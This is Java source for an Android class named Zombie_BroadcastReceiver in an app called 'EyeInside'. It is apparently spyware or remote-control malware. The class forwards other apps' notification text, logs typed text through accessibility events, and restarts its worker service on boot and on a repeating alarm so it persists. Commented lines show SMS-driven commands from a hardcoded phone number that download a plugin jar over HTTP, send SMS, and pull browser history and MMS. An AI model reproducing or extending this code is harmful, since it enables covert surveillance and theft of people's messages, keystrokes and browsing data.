package com.code4bones.EyeInside;

// adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n your.app.packagename/.YourReceiverClassName

import java.util.Calendar;
import java.util.List;
import com.code4bones.utils.NetLog;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;

public class Zombie_BroadcastReceiver extends BroadcastReceiver {

	public static String ACTION_NOTIFY = "com.code4bones.EyeInside.notify";
	public static String ACTION_KEYLOG = "com.code4bones.EyeInside.keylog";
	public static String ACTION_WAKEUP = "com.code4bones.EyeInside.wakeup";
	
	public static String EXTRA_EVENT_TYPE = "type";
	public static int EVENT_FOCUSED = 1;
	public static int EVENT_CHANGED = 2;
	
	
	
	
	
	public static String EXTRA_PACKAGE = "package";
	public static String EXTRA_TEXT = "text";
	public static String EXTRA_ALLTEXT = "alltext";
	
	public Context mContext = null;
	public Handler mHandler = new Handler();
	final  public static CommandPool mPool = CommandPool.getInstance();
	
	public Zombie_BroadcastReceiver() {
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		mContext = context;
		String action = intent.getAction();
		NetLog.v("ZOMBIE: Message from %s",action);
		mPool.Init(mContext);
		SharedPreferences prefs = mContext.getSharedPreferences("events", 1);
		
		if ( action.equals(Zombie_BroadcastReceiver.ACTION_NOTIFY )) {
			String packName = intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_PACKAGE);
			if ( !packName.equals("com.android.mms")) {
				String text = intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_ALLTEXT);//intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_TEXT);
				if ( prefs.contains(action)) {
					mPool.invokeCommand("text:Уведомление: %s",text);
					NetLog.v("Notify: %s",text);
				}
			}
		} else if (action.equals(Zombie_BroadcastReceiver.ACTION_KEYLOG )) {
			handleKeyLog(intent);
		} else {
			Zombie_BroadcastReceiver.startServiceIfNeeded(context);
			mPool.execPool(context);
			boolean reply = prefs.contains(action);
			if ( reply ) {
				mPool.invokeCommand("text:%s",mPool.mEvents.get(action));
				NetLog.v("Event %s will be %s",action,reply);
			}
			 //mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get plugin from:http://192.168.1.5/Test.jar",false));
			 //mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@notify title:Title;text:Hello Text World",false));
		}
		
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@sms to:+79672243716;msg:Приет Мир !"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@event unlock:1;power:1"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get browser history"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get mms from:130710;to:130713",false));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@keepalive time:2018",false));
		//ContactsUtils d;
	}

	public void handleKeyLog(Intent intent) {
	 int eventType = intent.getIntExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE, -1);
	 if ( eventType == -1 )
		 return;
	 if ( eventType == Zombie_BroadcastReceiver.EVENT_CHANGED ) {
		 AccessibilityEvent event = intent.getParcelableExtra("event");
		 NetLog.v("Text Changed ->%s",event.getText());
	 } else {
		 NetLog.v("Field focused");
	 } 
	}

	public static void serviceLoop(Context context,int sec) {
		Calendar cal = Calendar.getInstance();
		Intent intent = new Intent(context, WorkerService.class);
		PendingIntent pintent = PendingIntent.getService(context, 0, intent, 0);
		AlarmManager alarm = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sec*1000, pintent); 
	}
	
	public static void startServiceIfNeeded(Context context) {
		if ( !Zombie_BroadcastReceiver.isServiceRunning(context,"com.code4bones.EyeInside.WorkerService")) {
			//NetLog.v("ZOMBIE: Service not found,starting");
			serviceLoop(context,60 * 30);
		} else {
			//NetLog.v("ZOMBIE: Service is already running!");
		}
	}
	
	public static boolean isServiceRunning(Context context,String serviceClassName){
        final ActivityManager activityManager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
        final List<RunningServiceInfo> services = activityManager.getRunningServices(Integer.MAX_VALUE);
        for (RunningServiceInfo runningServiceInfo : services) {
        	if (runningServiceInfo.service.getClassName().equals(serviceClassName)){
                return true;
            }
        }
        return false;
     }	
}
